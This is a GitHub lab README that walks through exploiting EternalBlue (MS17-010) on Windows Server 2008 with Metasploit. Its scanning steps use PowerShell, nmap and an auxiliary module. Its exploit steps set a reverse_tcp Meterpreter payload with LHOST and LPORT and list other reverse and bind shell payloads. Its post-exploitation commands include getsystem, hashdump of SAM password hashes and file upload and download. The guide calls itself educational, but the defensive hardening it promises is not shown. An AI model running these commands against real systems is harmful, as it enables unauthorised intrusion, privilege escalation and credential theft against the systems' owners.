# Metasploit-Win2K8-Lab

## DISCLAIMER!!!

This repository is a step-by-step guide intended for educational and ethical penetration testing purposes only, to inform and demonstrate how to execute the EternalBlue (MS17-010) vulnerability on Windows 7/Windows 2008 Server, and how to secure said machines.

⚠️ **DO NOT ATTEMPT TO REPRODUCE THIS EXPLOIT ON ANY SYSTEM THAT YOU DO NOT OWN OR HAVE PERMISSION TO TEST ON. UNAUTHORIZED USE OF THE SHOWN TECHNIQUES ARE ILLEGAL.**

Under **18 U.S. Code § 1030 – Fraud and related activity in connection with computers** (Computer Fraud and Abuse Act), unauthorized access to computer systems is a federal offense punishable by **fines and imprisonment**.

---

# Prerequisites

Minimum System Requirements:  
* 4-8 GB Ram  
* 2-4 Cores  
* 30 GB Storage  

> VMware installed on WINDOWS  
Kali Linux, Install the prebuilt VMware VM from the offical website: **https://www.kali.org/get-kali/#kali-virtual-machines**  
Vulnerable Windows system. Link to my Windows Server 2008 VM :  

---

# About EternalBlue (MS17-010)

EternalBlue (MS17-010) is a severe vulnerability that exploits a buffer overflow flaw in Microsoft's Server Message Block (SMBv1) protocol, allowing attackers to gain access to the victim, and perform remote code execution on unpatched systems. It was developed and used by the U.S. National Security Agency (NSA), and later leaked by the Shadow Brokers hacking group. The EternalBlue exploit was notoriously used by the WannaCry hacking group. WannaCry would exploit a victim via EternalBlue, then upload their Ransomware worm, automatically spreading and infecting other devices on the network.

---

# Checking for MS17-010

***Windows:***    

Eternalblue exploits the SMBv1 protocol, we could check its status to see whether the system may be vulnerable. We could do this using this powershell command:  
``` powershell
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
Get-ItemProperty -Path $regPath -Name SMB1

```
the output should look like of the following
``` powershell
SMB1         : 1
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Pa
               rameters
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer
PSChildName  : Parameters
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
if SMBv1 is set to 0, SMBv1 is **disabled** and the system is **not vulnerable.**
if its set to 1, SMBv1 is **Enabled** and the system could be at risk if unpatched. To Definitively check the systems vulnerability you could run the following command to check if the EternalBlue patch is installed.   

Using cmd or powershell run:
``` powershell
wmic qfe get HotFixID | findstr KB4012212
```
If nothing is returned the patch is not installed and the system is at risk of being vulnerable. **if SMBv1 is enabled the system is vulnerable.**        

---

***Linux:***  
There are a few ways to check if a Windows system is vulnerable using Linux. The first method I'll demonstrate is by using the nmap command. You can use the **--script=vuln** option to run a collection of vulnerability scanning scripts from the Nmap library, which attempts to find all possible vulnerabilities the target might have. You could also use the "--script=smb*" option to run all of Nmap’s SMB related scripts, or the **--script=smb-vuln-ms17-010** option, which scans for the EternalBlue vulnerability exclusively and is the fastest. For our example, we’ll be using this last one.  
Using a shell input the following:
``` bash
nmap -sS -T4 XXX.XXX.XXX.XXX --script=smb-vuln-ms17-010
# -sS = optional, does not complete the full 3 way handshake, dropping the connection once we recieve the syn/ack flag
# -T4 = optional, increases scan speed by reducing probe delay, sending pings faster (250ms between) to make the scan quicker.
# XXX.XXX.XXX.XXX = system that will be scanned.
# --script=smb-vuln-ms17-010 = nmaps script to scan whether the machine is vulnerable to EternalBlue (MS17-010). 
```  
if vulnerable the output will look similar to the image below, with the smb-vuln-ms17-010 script stating the device is **VULNERABLE**, giving the Microsoft security code regarding the vulnerability, [MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
 and the associated CVE identifier, [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143).


![image](https://github.com/user-attachments/assets/a0aab1fc-0025-431f-a069-3d820c3457c0)  

The second method for checking if a system is vulnerable to the EternalBlue (MS17-010) exploit is by using Metasploit Framework's MS17-010 auxiliary module. Here is the process for scanning:

``` bash
msfconsole
# Launches the Metasploit Framework

msf6 > use auxiliary/scanner/smb/smb_ms17_010
## sets the auxilary scanning module we will use to check MS17-010 vulnerability status

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS XXX.XXX.XXX.XXX
# Sets the Remote Host (system we are scanning)

msf6 auxiliary(scanner/smb/smb_ms17_010) > Show options
# shows options we've set for our module/payload, verify before running it.

msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit
```  

 Once run, if the machine is vulnerable, the output would look like:  

![image](https://github.com/user-attachments/assets/bc32b8af-8e92-4d84-b7a2-d7559a96d794)

---

# Exploitation

Now that we know that the system is vulnerable, we could exploit it using the following commands:
``` bash
msfconsole

msf6 > use exploit/windows/smb/ms17_010_eternalblue
# or use the module below, either could work. If you're having issues with one, try the other
msf > use exploit/windows/smb/ms17_010_psexec

msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
# You could set a variety of different payloads, in this example I will be using a reverse TCP Meterpreter payload.
# The EternalBlue exploit only works with x64 payloads. To check the available payloads, you could run [show payloads]
# Recommended payloads:
# /windows/x64/meterpreter/bind_tcp (Meterpreter shell, attacker creates listener, victim connects)
# /windows/x64/meterpreter/reverse_tcp (Meterpreter shell, victim creates listener, attacker connects)
# /windows/x64/meterpreter/reverse_http (Meterpreter shell, victim connects over HTTP, attacker listens [more stealthy])
# /windows/x64/shell/bind_tcp (cmd.exe shell, attacker creates listner, victim connects)
# /windows/x64/shell/reverse_tcp (cmd.exe shell, victim creates listener, attacker connects)

msf6 exploit(windows/smb/ms17_010_eternalblue) > Set RHOSTS XXX.XXX.XXX.XXX

msf6 exploit(windows/smb/ms17_010_eternalblue) > Set RPORT 445
# RPORT = SMB's vulnerable port, not necessary as the exploit specifies 445 by default. Change only if port forwarding.

msf6 exploit(windows/smb/ms17_010_eternalblue) > Set LHOST XXX.XXX.XXX.XXX
# LHOST = Local HOST, your attacking machine's IP

msf6 exploit(windows/smb/ms17_010_eternalblue) > Set LPORT 1337
# LPORT = Local PORT, used only for reverse payloads. Can be set to any ephemeral high port (1000–65535)

msf6 exploit(windows/smb/ms17_010_eternalblue) > Show Options

msf6 exploit(windows/smb/ms17_010_eternalblue) > Exploit
```  
if the exploit is successful, the output should look like the image below, and you will have access to a shell.  

![image](https://github.com/user-attachments/assets/12d1fb14-cbd2-4b4a-b006-7ab892ac3a80)

---

# Post-Exploitation

once we have access to the machine, and preferably have a Meterpreter shell open, we can perform post exploitation. Meterpreter is a powerful shell that provides a versatile  set of tools not available through CMD or Powershell. Below are some useful meterpreter commands to get started.

``` Meterpreter
meterpreter > sysinfo
# Provides similar output to CMD's systeminfo command

meterpreter > ipconfig
meterpreter > ifconfig
# Provides networking information on the victim

meterpreter > getuid
# Displays the user your Meterpreter shell is running as

meterpreter > ps
# Shows all running processes

meterpreter > migrate <pid>
# Migrates the Meterpreter shell to a different process. Can be used for privilege escalation or stability

meterpreter > getsystem
# Attempts to elevate your Meterpreter shell to NT AUTHORITY\SYSTEM using built-in techniques

meterpreter > hashdump
# Extracts user accounts and their associated password hashes from the SAM database; hashes can be cracked using John or Hashcat

meterpreter > upload "/home/attacker/file.ps1" "C:\Windows\Victim\file.ps1"
# Uploads a file from the attacker's machine to the victim

meterpreter > download "C:\Windows\Victim\filetodownload.txt" "/home/attacker/downloaded.txt"
# Downloads a file from the victim machine to the attacker's machine

meterpreter > shell
# Launches a CMD shell on a Windows victim or a Bash shell on a Linux victim
```
